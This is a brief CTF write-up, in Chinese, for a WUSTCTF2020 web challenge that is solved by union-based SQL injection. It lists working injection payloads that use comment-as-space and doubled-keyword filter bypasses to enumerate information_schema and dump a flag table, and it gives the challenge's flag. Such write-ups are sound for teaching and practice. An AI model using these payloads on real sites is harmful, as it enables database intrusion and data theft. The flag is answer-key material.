## [WUSTCTF2020]颜值成绩查询

> 联合注入sql

![image-20250116213345082](https://gitee.com/bx33661/image/raw/master/path/image-20250116213345082.png)

```(空)
database():ctf
tablename: flag,score
columnname: flag,value
flag:Hi 2, your score is: flagflag{57a8846b-a2d4-4f9e-bfce-31bdaa3a4e70}
```

---》

```(空)
1/**/order/**/by/**/3%23
1/**/order/**/by/**/4%23
-1/**/ununionion/**/select/**/1,database(),4%23
-1/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='ctf';%23
-1/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag';%23
-1/**/ununionion/**/select/**/1,2,group_concat(flag,value)/**/from/**/flag;
```

